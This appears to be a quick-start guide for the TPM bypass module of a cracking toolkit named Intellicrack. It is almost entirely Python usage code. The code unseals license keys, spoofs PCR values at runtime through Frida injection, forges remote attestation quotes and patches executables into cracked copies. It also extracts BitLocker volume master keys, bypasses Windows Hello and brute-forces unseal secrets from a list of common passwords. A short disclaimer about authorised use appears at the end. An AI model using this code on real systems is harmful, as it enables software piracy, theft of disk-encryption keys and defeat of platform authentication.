# TPM Bypass Quick Start Guide

## Installation

```bash
pip install pycryptodome pywin32 frida frida-tools
```

## Basic Usage

### 1. Detect TPM Protection

```python
from intellicrack.core.protection_bypass.tpm_bypass import detect_tpm_usage, analyze_tpm_protection

if detect_tpm_usage("protected.exe"):
    analysis = analyze_tpm_protection("protected.exe")
    print(f"Strength: {analysis['protection_strength']}")
    print(f"TPM APIs: {analysis['tpm_apis']}")
```

### 2. Extract Sealed Keys

```python
from intellicrack.core.protection_bypass.tpm_bypass import TPMBypassEngine

engine = TPMBypassEngine()
sealed_keys = engine.extract_sealed_keys()

for key_name, key_data in sealed_keys.items():
    print(f"{key_name}: {len(key_data)} bytes")
```

### 3. Unseal License Key

```python
engine = TPMBypassEngine()

sealed_blob = open("license.dat", "rb").read()
unsealed = engine.unseal_tpm_key(
    sealed_blob=sealed_blob,
    auth_value=b"",
    pcr_policy={0: bytes(32), 7: bytes(32)}
)

if unsealed:
    print(f"License key: {unsealed.hex()}")
```

### 4. Runtime PCR Spoofing

```python
engine = TPMBypassEngine()

engine.attach_to_process_frida("app.exe")

engine.inject_pcr_manipulator()

engine.spoof_pcr_runtime(7, bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb"))

engine.block_pcr_extend_runtime(0)

engine.bypass_secure_boot_runtime()

input("Press Enter to detach...")
engine.detach_frida()
```

### 5. Spoof Remote Attestation

```python
engine = TPMBypassEngine()

attestation = engine.spoof_remote_attestation(
    nonce=server_challenge,
    expected_pcrs={
        7: bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb")
    }
)

print(f"Quote: {attestation['quote']['signature'].hex()}")
```

### 6. Binary Patching

```python
from intellicrack.core.protection_bypass.tpm_bypass import bypass_tpm_protection

bypass_tpm_protection(
    binary_path="protected.exe",
    output_path="protected_cracked.exe"
)
```

### 7. Extract BitLocker VMK

```python
engine = TPMBypassEngine()

vmk = engine.extract_bitlocker_vmk()

if vmk:
    print(f"VMK: {vmk.hex()}")
```

### 8. Bypass Windows Hello

```python
engine = TPMBypassEngine()

hello_keys = engine.bypass_windows_hello()

print(f"Biometric template: {len(hello_keys['biometric_template'])} bytes")
print(f"PIN unlock key: {hello_keys['pin_unlock'].hex()}")
```

### 9. Command Interception

```python
engine = TPMBypassEngine()

engine.attach_to_process_frida("app.exe")
engine.inject_tpm_command_interceptor()

commands = engine.get_intercepted_commands_frida()

for cmd in commands:
    print(f"{cmd['command']['commandName']}: {cmd['timestamp']}")

engine.detach_frida()
```

### 10. Complete Workflow

```python
from intellicrack.core.protection_bypass.tpm_bypass import TPMBypassEngine

engine = TPMBypassEngine()

if not engine.detect_tpm_usage("app.exe"):
    print("No TPM protection")
    exit()

analysis = engine.analyze_tpm_protection("app.exe")

pcr_values = {pcr: bytes(32) for pcr in analysis['pcr_usage']}
engine.manipulate_pcr_values(pcr_values)

sealed_keys = engine.extract_sealed_keys()

for key_name, sealed_blob in sealed_keys.items():
    unsealed = engine.unseal_tpm_key(sealed_blob, b"", pcr_values)
    if unsealed:
        print(f"Unsealed {key_name}: {unsealed.hex()}")

attestation = engine.spoof_remote_attestation(
    nonce=b"challenge",
    expected_pcrs=pcr_values
)

print("Bypass complete!")
```

## Common Patterns

### Pattern 1: Static Analysis + Patching

```python
from intellicrack.core.protection_bypass.tpm_bypass import detect_tpm_usage, analyze_tpm_protection, bypass_tpm_protection

if detect_tpm_usage("app.exe"):
    analysis = analyze_tpm_protection("app.exe")

    if analysis['protection_strength'] in ['weak', 'medium']:
        bypass_tpm_protection("app.exe", "app_patched.exe")
```

### Pattern 2: Runtime Bypass

```python
engine = TPMBypassEngine()

engine.attach_to_process_frida("app.exe")

engine.inject_pcr_manipulator()

engine.inject_tpm_command_interceptor()

engine.bypass_secure_boot_runtime()

commands = engine.get_intercepted_commands_frida()

engine.detach_frida()
```

### Pattern 3: Key Extraction + Unsealing

```python
engine = TPMBypassEngine()

sealed_keys = engine.extract_sealed_keys()

pcr_policy = {
    0: bytes(32),
    7: bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb")
}

for key_name, sealed_blob in sealed_keys.items():
    for auth in [b"", b"WellKnownSecret", hashlib.sha256(b"password").digest()]:
        unsealed = engine.unseal_tpm_key(sealed_blob, auth, pcr_policy)

        if unsealed:
            print(f"Success with auth: {auth.hex()}")
            break
```

## PCR Values Reference

| PCR | Purpose | Typical Use |
|-----|---------|-------------|
| 0 | BIOS/Platform | Boot firmware measurement |
| 1 | BIOS Configuration | Firmware configuration |
| 2 | Option ROM | Option ROM code |
| 3 | Option ROM Config | Option ROM data |
| 4 | MBR | Master Boot Record |
| 5 | Boot Manager | Bootloader code |
| 6 | Boot Manager Config | Bootloader configuration |
| 7 | **Secure Boot** | **Most commonly used for licensing** |
| 8-9 | Kernel/OS | Operating system |
| 10 | IMA | Integrity Measurement Architecture |
| 11 | **BitLocker** | **Drive encryption** |
| 12-13 | Boot events | Additional measurements |
| 14 | MOK | Machine Owner Keys |
| 23 | Application | **Application-specific** |

### Secure Boot PCR7 Value (Enabled)
```
a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb
```

## Troubleshooting

### Frida Not Working

```python
if not HAS_FRIDA:
    print("Install: pip install frida frida-tools")
```

### No Keys Extracted

```python
engine = TPMBypassEngine()

tpm_version = engine.detect_tpm_version()

if tpm_version:
    print(f"TPM {tpm_version} detected")

    sealed_keys = engine.extract_sealed_keys(auth_value=b"")

    if not sealed_keys:
        print("No keys found - trying memory extraction...")
        mem_keys = engine.extract_keys_from_memory()
        print(f"Found {len(mem_keys)} keys in memory")
```

### Unsealing Fails

```python
common_auths = [
    b"",
    b"WellKnownSecret",
    hashlib.sha256(b"").digest(),
    hashlib.sha256(b"password").digest(),
    hashlib.sha256(b"machine_id").digest(),
]

for auth in common_auths:
    result = engine.unseal_tpm_key(sealed_blob, auth, pcr_policy)
    if result:
        print(f"Success with: {auth.hex()}")
        break
```

### Permission Denied

Run as Administrator on Windows:

```bash
powershell -Command "Start-Process python -Verb RunAs -ArgumentList 'script.py'"
```

## Performance Tips

1. **Use runtime bypass for active processes**
2. **Use static patching for offline analysis**
3. **Cache extracted keys to avoid repeated extraction**
4. **Limit PCR policy to actually used PCRs**
5. **Use memory extraction only when NVRAM fails**

## Security Notes

- Always test in isolated environment
- Never use on production systems without authorization
- Use for security research and defensive testing only
- Report vulnerabilities to software vendors
- Follow responsible disclosure practices

## Support

- Documentation: `D:\Intellicrack\docs\TPM_BYPASS_COMPLETE.md`
- Examples: `D:\Intellicrack\examples\tpm_bypass_example.py`
- Source: `D:\Intellicrack\intellicrack\core\protection_bypass\tpm_bypass.py`
- Frida Scripts: `D:\Intellicrack\intellicrack\scripts\frida\tpm_*.js`
